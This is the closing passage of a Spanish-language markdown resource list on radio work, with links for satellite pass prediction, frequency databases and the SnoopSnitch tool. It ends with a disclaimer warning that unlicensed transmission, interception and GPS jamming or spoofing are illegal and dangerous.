- [SnoopSnitch](https://opensource.srlabs.de/projects/snoopsnitch)

### Predicción de pasadas satelitales
- [Celestrak TLE](https://www.celestrak.com/NORAD/elements/)
- [Heavens Above](https://www.heavens-above.com/)
- [N2YO](https://www.n2yo.com/)
- [GPredict](http://gpredict.oz9aec.net/)

### Bases de datos de frecuencias
- [RadioReference](https://www.radioreference.com/)
- [Signal Identification Guide](https://www.sigidwiki.com/)
- [FCC Spectrum](https://www.fcc.gov/engineering-technology/policy-and-rules-division/general/spectrum)
- [Shortwave Schedule](https://www.shortwaveschedule.com/)

---

> **Disclaimer**: Este material es estrictamente educativo. La transmisión en frecuencias reguladas sin licencia es ilegal en la mayoría de los países. La interceptación de comunicaciones ajenas puede ser un delito grave. Usá este conocimiento responsablemente, en laboratorios blindados o en bandas ISM/libres. El GPS jamming/spoofing puede causar accidentes de aviación o navegación. No lo hagas en el mundo real sin autorización explícita.


